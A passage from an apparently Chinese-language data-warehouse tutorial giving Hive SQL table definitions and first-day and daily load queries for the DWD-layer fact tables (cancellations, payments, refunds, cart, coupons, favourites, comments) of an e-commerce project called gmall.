ods_order_detail_inc</p><p>where dt = ‘2020-06-14’</p><p>and type = ‘bootstrap-insert’</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id,</p><p>data.operate_time canel_time</p><p>from ods_order_info_inc</p><p>where dt = ‘2020-06-14’</p><p>and type = ‘bootstrap-insert’</p><p>and data.order_status=’1003’</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ods_order_detail_activity_inc</p><p>where dt = ‘2020-06-14’</p><p>and type = ‘bootstrap-insert’</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ods_order_detail_coupon_inc</p><p>where dt = ‘2020-06-14’</p><p>and type = ‘bootstrap-insert’</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-14’</p><p>and parent_code=’24’</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dwd_trade_cancel_detail_inc partition (dt=’2020-06-15’)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_format(canel_time,’yyyy-MM-dd’) date_id,</p><p>canel_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ods_order_detail_inc</p><p>where (dt=’2020-06-15’ or dt=date_add(‘2020-06-15’,-1))</p><p>and (type = ‘insert’ or type= ‘bootstrap-insert’)</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id,</p><p>data.operate_time canel_time</p><p>from ods_order_info_inc</p><p>where dt = ‘2020-06-15’</p><p>and type = ‘update’</p><p>and data.order_status=’1003’</p><p>and array_contains(map_keys(old),’order_status’)</p><p>) oi</p><p>on order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ods_order_detail_activity_inc</p><p>where (dt=’2020-06-15’ or dt=date_add(‘2020-06-15’,-1))</p><p>and (type = ‘insert’ or type= ‘bootstrap-insert’)</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ods_order_detail_coupon_inc</p><p>where (dt=’2020-06-15’ or dt=date_add(‘2020-06-15’,-1))</p><p>and (type = ‘insert’ or type= ‘bootstrap-insert’)</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-15’</p><p>and parent_code=’24’</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><h3 id="交易域支付成功事务事实表"><a href="#交易域支付成功事务事实表" class="headerlink" title="交易域支付成功事务事实表"></a>交易域支付成功事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_trade_pay_detail_suc_inc;</p><p>CREATE EXTERNAL TABLE dwd_trade_pay_detail_suc_inc</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`order_id` STRING COMMENT ‘订单id’,</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`sku_id` STRING COMMENT ‘商品id’,</p><p>`province_id` STRING COMMENT ‘省份id’,</p><p>`activity_id` STRING COMMENT ‘参与活动规则id’,</p><p>`activity_rule_id` STRING COMMENT ‘参与活动规则id’,</p><p>`coupon_id` STRING COMMENT ‘使用优惠券id’,</p><p>`payment_type_code` STRING COMMENT ‘支付类型编码’,</p><p>`payment_type_name` STRING COMMENT ‘支付类型名称’,</p><p>`date_id` STRING COMMENT ‘支付日期id’,</p><p>`callback_time` STRING COMMENT ‘支付成功时间’,</p><p>`source_id` STRING COMMENT ‘来源编号’,</p><p>`source_type_code` STRING COMMENT ‘来源类型编码’,</p><p>`source_type_name` STRING COMMENT ‘来源类型名称’,</p><p>`sku_num` BIGINT COMMENT ‘商品数量’,</p><p>`split_original_amount` DECIMAL(16, 2) COMMENT ‘应支付原始金额’,</p><p>`split_activity_amount` DECIMAL(16, 2) COMMENT ‘支付活动优惠分摊’,</p><p>`split_coupon_amount` DECIMAL(16, 2) COMMENT ‘支付优惠券优惠分摊’,</p><p>`split_payment_amount` DECIMAL(16, 2) COMMENT ‘支付金额’</p><p>) COMMENT ‘交易域成功支付事务事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_trade_pay_detail_suc_inc/‘</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>insert overwrite table dwd_trade_pay_detail_suc_inc partition (dt)</p><p>select</p><p>od.id,</p><p>od.order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>payment_type,</p><p>pay_dic.dic_name,</p><p>date_format(callback_time,’yyyy-MM-dd’) date_id,</p><p>callback_time,</p><p>source_id,</p><p>source_type,</p><p>src_dic.dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount,</p><p>date_format(callback_time,’yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ods_order_detail_inc</p><p>where dt = ‘2020-06-14’</p><p>and type = ‘bootstrap-insert’</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.user_id,</p><p>data.order_id,</p><p>data.payment_type,</p><p>data.callback_time</p><p>from ods_payment_info_inc</p><p>where dt=’2020-06-14’</p><p>and type=’bootstrap-insert’</p><p>and data.payment_status=’1602’</p><p>) pi</p><p>on od.order_id=pi.order_id</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where dt = ‘2020-06-14’</p><p>and type = ‘bootstrap-insert’</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ods_order_detail_activity_inc</p><p>where dt = ‘2020-06-14’</p><p>and type = ‘bootstrap-insert’</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ods_order_detail_coupon_inc</p><p>where dt = ‘2020-06-14’</p><p>and type = ‘bootstrap-insert’</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-14’</p><p>and parent_code=’11’</p><p>) pay_dic</p><p>on pi.payment_type=pay_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-14’</p><p>and parent_code=’24’</p><p>)src_dic</p><p>on od.source_type=src_dic.dic_code;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dwd_trade_pay_detail_suc_inc partition (dt=’2020-06-15’)</p><p>select</p><p>od.id,</p><p>od.order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>payment_type,</p><p>pay_dic.dic_name,</p><p>date_format(callback_time,’yyyy-MM-dd’) date_id,</p><p>callback_time,</p><p>source_id,</p><p>source_type,</p><p>src_dic.dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ods_order_detail_inc</p><p>where (dt = ‘2020-06-15’ or dt = date_add(‘2020-06-15’,-1))</p><p>and (type = ‘insert’ or type = ‘bootstrap-insert’)</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.user_id,</p><p>data.order_id,</p><p>data.payment_type,</p><p>data.callback_time</p><p>from ods_payment_info_inc</p><p>where dt=’2020-06-15’</p><p>and type=’update’</p><p>and array_contains(map_keys(old),’payment_status’)</p><p>and data.payment_status=’1602’</p><p>) pi</p><p>on od.order_id=pi.order_id</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where (dt = ‘2020-06-15’ or dt = date_add(‘2020-06-15’,-1))</p><p>and (type = ‘insert’ or type = ‘bootstrap-insert’)</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ods_order_detail_activity_inc</p><p>where (dt = ‘2020-06-15’ or dt = date_add(‘2020-06-15’,-1))</p><p>and (type = ‘insert’ or type = ‘bootstrap-insert’)</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ods_order_detail_coupon_inc</p><p>where (dt = ‘2020-06-15’ or dt = date_add(‘2020-06-15’,-1))</p><p>and (type = ‘insert’ or type = ‘bootstrap-insert’)</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-15’</p><p>and parent_code=’11’</p><p>) pay_dic</p><p>on pi.payment_type=pay_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-15’</p><p>and parent_code=’24’</p><p>)src_dic</p><p>on od.source_type=src_dic.dic_code;</p><h3 id="交易域退单事务事实表"><a href="#交易域退单事务事实表" class="headerlink" title="交易域退单事务事实表"></a>交易域退单事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_trade_order_refund_inc;</p><p>CREATE EXTERNAL TABLE dwd_trade_order_refund_inc</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`user_id` STRING COMMENT ‘用户ID’,</p><p>`order_id` STRING COMMENT ‘订单ID’,</p><p>`sku_id` STRING COMMENT ‘商品ID’,</p><p>`province_id` STRING COMMENT ‘地区ID’,</p><p>`date_id` STRING COMMENT ‘日期ID’,</p><p>`create_time` STRING COMMENT ‘退单时间’,</p><p>`refund_type_code` STRING COMMENT ‘退单类型编码’,</p><p>`refund_type_name` STRING COMMENT ‘退单类型名称’,</p><p>`refund_reason_type_code` STRING COMMENT ‘退单原因类型编码’,</p><p>`refund_reason_type_name` STRING COMMENT ‘退单原因类型名称’,</p><p>`refund_reason_txt` STRING COMMENT ‘退单原因描述’,</p><p>`refund_num` BIGINT COMMENT ‘退单件数’,</p><p>`refund_amount` DECIMAL(16, 2) COMMENT ‘退单金额’</p><p>) COMMENT ‘交易域退单事务事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_trade_order_refund_inc/‘</p><p>TBLPROPERTIES (“orc.compress” = “snappy”);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>insert overwrite table dwd_trade_order_refund_inc partition(dt)</p><p>select</p><p>ri.id,</p><p>user_id,</p><p>order_id,</p><p>sku_id,</p><p>province_id,</p><p>date_format(create_time,’yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>refund_type,</p><p>type_dic.dic_name,</p><p>refund_reason_type,</p><p>reason_dic.dic_name,</p><p>refund_reason_txt,</p><p>refund_num,</p><p>refund_amount,</p><p>date_format(create_time,’yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_type,</p><p>data.refund_num,</p><p>data.refund_amount,</p><p>data.refund_reason_type,</p><p>data.refund_reason_txt,</p><p>data.create_time</p><p>from ods_order_refund_info_inc</p><p>where dt=’2020-06-14’</p><p>and type=’bootstrap-insert’</p><p>)ri</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where dt=’2020-06-14’</p><p>and type=’bootstrap-insert’</p><p>)oi</p><p>on ri.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-14’</p><p>and parent_code = ‘15’</p><p>)type_dic</p><p>on ri.refund_type=type_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-14’</p><p>and parent_code = ‘13’</p><p>)reason_dic</p><p>on ri.refund_reason_type=reason_dic.dic_code;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dwd_trade_order_refund_inc partition(dt=’2020-06-15’)</p><p>select</p><p>ri.id,</p><p>user_id,</p><p>order_id,</p><p>sku_id,</p><p>province_id,</p><p>date_format(create_time,’yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>refund_type,</p><p>type_dic.dic_name,</p><p>refund_reason_type,</p><p>reason_dic.dic_name,</p><p>refund_reason_txt,</p><p>refund_num,</p><p>refund_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_type,</p><p>data.refund_num,</p><p>data.refund_amount,</p><p>data.refund_reason_type,</p><p>data.refund_reason_txt,</p><p>data.create_time</p><p>from ods_order_refund_info_inc</p><p>where dt=’2020-06-15’</p><p>and type=’insert’</p><p>)ri</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where dt=’2020-06-15’</p><p>and type=’update’</p><p>and data.order_status=’1005’</p><p>and array_contains(map_keys(old),’order_status’)</p><p>)oi</p><p>on ri.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-15’</p><p>and parent_code = ‘15’</p><p>)type_dic</p><p>on ri.refund_type=type_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-15’</p><p>and parent_code = ‘13’</p><p>)reason_dic</p><p>on ri.refund_reason_type=reason_dic.dic_code;</p><h3 id="交易域退款成功事务事实表"><a href="#交易域退款成功事务事实表" class="headerlink" title="交易域退款成功事务事实表"></a>交易域退款成功事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_trade_refund_pay_suc_inc;</p><p>CREATE EXTERNAL TABLE dwd_trade_refund_pay_suc_inc</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`user_id` STRING COMMENT ‘用户ID’,</p><p>`order_id` STRING COMMENT ‘订单编号’,</p><p>`sku_id` STRING COMMENT ‘SKU编号’,</p><p>`province_id` STRING COMMENT ‘地区ID’,</p><p>`payment_type_code` STRING COMMENT ‘支付类型编码’,</p><p>`payment_type_name` STRING COMMENT ‘支付类型名称’,</p><p>`date_id` STRING COMMENT ‘日期ID’,</p><p>`callback_time` STRING COMMENT ‘支付成功时间’,</p><p>`refund_num` DECIMAL(16, 2) COMMENT ‘退款件数’,</p><p>`refund_amount` DECIMAL(16, 2) COMMENT ‘退款金额’</p><p>) COMMENT ‘交易域提交退款成功事务事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_trade_refund_pay_suc_inc/‘</p><p>TBLPROPERTIES (“orc.compress” = “snappy”);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>insert overwrite table dwd_trade_refund_pay_suc_inc partition(dt)</p><p>select</p><p>rp.id,</p><p>user_id,</p><p>rp.order_id,</p><p>rp.sku_id,</p><p>province_id,</p><p>payment_type,</p><p>dic_name,</p><p>date_format(callback_time,’yyyy-MM-dd’) date_id,</p><p>callback_time,</p><p>refund_num,</p><p>total_amount,</p><p>date_format(callback_time,’yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.payment_type,</p><p>data.callback_time,</p><p>data.total_amount</p><p>from ods_refund_payment_inc</p><p>where dt=’2020-06-14’</p><p>and type = ‘bootstrap-insert’</p><p>and data.refund_status=’1602’</p><p>)rp</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where dt=’2020-06-14’</p><p>and type=’bootstrap-insert’</p><p>)oi</p><p>on rp.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_num</p><p>from ods_order_refund_info_inc</p><p>where dt=’2020-06-14’</p><p>and type=’bootstrap-insert’</p><p>)ri</p><p>on rp.order_id=ri.order_id</p><p>and rp.sku_id=ri.sku_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-14’</p><p>and parent_code=’11’</p><p>)dic</p><p>on rp.payment_type=dic.dic_code;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dwd_trade_refund_pay_suc_inc partition(dt=’2020-06-15’)</p><p>select</p><p>rp.id,</p><p>user_id,</p><p>rp.order_id,</p><p>rp.sku_id,</p><p>province_id,</p><p>payment_type,</p><p>dic_name,</p><p>date_format(callback_time,’yyyy-MM-dd’) date_id,</p><p>callback_time,</p><p>refund_num,</p><p>total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.payment_type,</p><p>data.callback_time,</p><p>data.total_amount</p><p>from ods_refund_payment_inc</p><p>where dt=’2020-06-15’</p><p>and type = ‘update’</p><p>and array_contains(map_keys(old),’refund_status’)</p><p>and data.refund_status=’1602’</p><p>)rp</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where dt=’2020-06-15’</p><p>and type=’update’</p><p>and data.order_status=’1006’</p><p>and array_contains(map_keys(old),’order_status’)</p><p>)oi</p><p>on rp.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_num</p><p>from ods_order_refund_info_inc</p><p>where dt=’2020-06-15’</p><p>and type=’update’</p><p>and data.refund_status=’0705’</p><p>and array_contains(map_keys(old),’refund_status’)</p><p>)ri</p><p>on rp.order_id=ri.order_id</p><p>and rp.sku_id=ri.sku_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-15’</p><p>and parent_code=’11’</p><p>)dic</p><p>on rp.payment_type=dic.dic_code;</p><h3 id="交易域购物车周期快照事实表"><a href="#交易域购物车周期快照事实表" class="headerlink" title="交易域购物车周期快照事实表"></a>交易域购物车周期快照事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_trade_cart_full;</p><p>CREATE EXTERNAL TABLE dwd_trade_cart_full</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`sku_id` STRING COMMENT ‘商品id’,</p><p>`sku_name` STRING COMMENT ‘商品名称’,</p><p>`sku_num` BIGINT COMMENT ‘加购物车件数’</p><p>) COMMENT ‘交易域购物车周期快照事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_trade_cart_full/‘</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dwd_trade_cart_full partition(dt=’2020-06-14’)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>sku_num</p><p>from ods_cart_info_full</p><p>where dt=’2020-06-14’</p><p>and is_ordered=’0’;</p><h3 id="工具域优惠券领取事务事实表"><a href="#工具域优惠券领取事务事实表" class="headerlink" title="工具域优惠券领取事务事实表"></a>工具域优惠券领取事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_tool_coupon_get_inc;</p><p>CREATE EXTERNAL TABLE dwd_tool_coupon_get_inc</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`coupon_id` STRING COMMENT ‘优惠券ID’,</p><p>`user_id` STRING COMMENT ‘userid’,</p><p>`date_id` STRING COMMENT ‘日期ID’,</p><p>`get_time` STRING COMMENT ‘领取时间’</p><p>) COMMENT ‘优惠券领取事务事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_tool_coupon_get_inc/‘</p><p>TBLPROPERTIES (“orc.compress” = “snappy”);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>insert overwrite table dwd_tool_coupon_get_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>date_format(data.get_time,’yyyy-MM-dd’) date_id,</p><p>data.get_time,</p><p>date_format(data.get_time,’yyyy-MM-dd’)</p><p>from ods_coupon_use_inc</p><p>where dt=’2020-06-14’</p><p>and type=’bootstrap-insert’;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dwd_tool_coupon_get_inc partition (dt=’2020-06-15’)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>date_format(data.get_time,’yyyy-MM-dd’) date_id,</p><p>data.get_time</p><p>from ods_coupon_use_inc</p><p>where dt=’2020-06-15’</p><p>and type=’insert’;</p><h3 id="工具域优惠券使用-下单-事务事实表"><a href="#工具域优惠券使用-下单-事务事实表" class="headerlink" title="工具域优惠券使用(下单)事务事实表"></a>工具域优惠券使用(下单)事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_tool_coupon_order_inc;</p><p>CREATE EXTERNAL TABLE dwd_tool_coupon_order_inc</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`coupon_id` STRING COMMENT ‘优惠券ID’,</p><p>`user_id` STRING COMMENT ‘user_id’,</p><p>`order_id` STRING COMMENT ‘order_id’,</p><p>`date_id` STRING COMMENT ‘日期ID’,</p><p>`order_time` STRING COMMENT ‘使用下单时间’</p><p>) COMMENT ‘优惠券使用下单事务事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_tool_coupon_order_inc/‘</p><p>TBLPROPERTIES (“orc.compress” = “snappy”);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>insert overwrite table dwd_tool_coupon_order_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.using_time,’yyyy-MM-dd’) date_id,</p><p>data.using_time,</p><p>date_format(data.using_time,’yyyy-MM-dd’)</p><p>from ods_coupon_use_inc</p><p>where dt=’2020-06-14’</p><p>and type=’bootstrap-insert’</p><p>and data.using_time is not null;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dwd_tool_coupon_order_inc partition(dt=’2020-06-15’)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.using_time,’yyyy-MM-dd’) date_id,</p><p>data.using_time</p><p>from ods_coupon_use_inc</p><p>where dt=’2020-06-15’</p><p>and type=’update’</p><p>and array_contains(map_keys(old),’using_time’);</p><h3 id="工具域优惠券使用-支付-事务事实表"><a href="#工具域优惠券使用-支付-事务事实表" class="headerlink" title="工具域优惠券使用(支付)事务事实表"></a>工具域优惠券使用(支付)事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_tool_coupon_pay_inc;</p><p>CREATE EXTERNAL TABLE dwd_tool_coupon_pay_inc</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`coupon_id` STRING COMMENT ‘优惠券ID’,</p><p>`user_id` STRING COMMENT ‘user_id’,</p><p>`order_id` STRING COMMENT ‘order_id’,</p><p>`date_id` STRING COMMENT ‘日期ID’,</p><p>`payment_time` STRING COMMENT ‘使用下单时间’</p><p>) COMMENT ‘优惠券使用支付事务事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_tool_coupon_pay_inc/‘</p><p>TBLPROPERTIES (“orc.compress” = “snappy”);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>insert overwrite table dwd_tool_coupon_pay_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.used_time,’yyyy-MM-dd’) date_id,</p><p>data.used_time,</p><p>date_format(data.used_time,’yyyy-MM-dd’)</p><p>from ods_coupon_use_inc</p><p>where dt=’2020-06-14’</p><p>and type=’bootstrap-insert’</p><p>and data.used_time is not null;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dwd_tool_coupon_pay_inc partition(dt=’2020-06-15’)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.used_time,’yyyy-MM-dd’) date_id,</p><p>data.used_time</p><p>from ods_coupon_use_inc</p><p>where dt=’2020-06-15’</p><p>and type=’update’</p><p>and array_contains(map_keys(old),’used_time’);</p><h3 id="互动域收藏商品事务事实表"><a href="#互动域收藏商品事务事实表" class="headerlink" title="互动域收藏商品事务事实表"></a>互动域收藏商品事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_interaction_favor_add_inc;</p><p>CREATE EXTERNAL TABLE dwd_interaction_favor_add_inc</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`sku_id` STRING COMMENT ‘sku_id’,</p><p>`date_id` STRING COMMENT ‘日期id’,</p><p>`create_time` STRING COMMENT ‘收藏时间’</p><p>) COMMENT ‘收藏事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_interaction_favor_add_inc/‘</p><p>TBLPROPERTIES (“orc.compress” = “snappy”);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dwd_interaction_favor_add_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>date_format(data.create_time,’yyyy-MM-dd’) date_id,</p><p>data.create_time,</p><p>date_format(data.create_time,’yyyy-MM-dd’)</p><p>from ods_favor_info_inc</p><p>where dt=’2020-06-14’</p><p>and type = ‘bootstrap-insert’;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dwd_interaction_favor_add_inc partition(dt=’2020-06-15’)</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>date_format(data.create_time,’yyyy-MM-dd’) date_id,</p><p>data.create_time</p><p>from ods_favor_info_inc</p><p>where dt=’2020-06-15’</p><p>and type = ‘insert’;</p><h3 id="互动域评价事务事实表"><a href="#互动域评价事务事实表" class="headerlink" title="互动域评价事务事实表"></a>互动域评价事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_interaction_comment_inc;</p><p>CREATE EXTERNAL TABLE dwd_interaction_comment_inc</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`user_id` STRING COMMENT ‘用户ID’,</p><p>`sku_id` STRING COMMENT ‘sku_id’,</p><p>`order_id` STRING COMMENT ‘订单ID’,</p><p>`date_id` STRING COMMENT ‘日期ID’,</p><p>`create_time` STRING COMMENT ‘评价时间’,</p><p>`appraise_code` STRING COMMENT ‘评价编码’,</p><p>`appraise_name` STRING COMMENT ‘评价名称’</p><p>) COMMENT ‘评价事务事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION 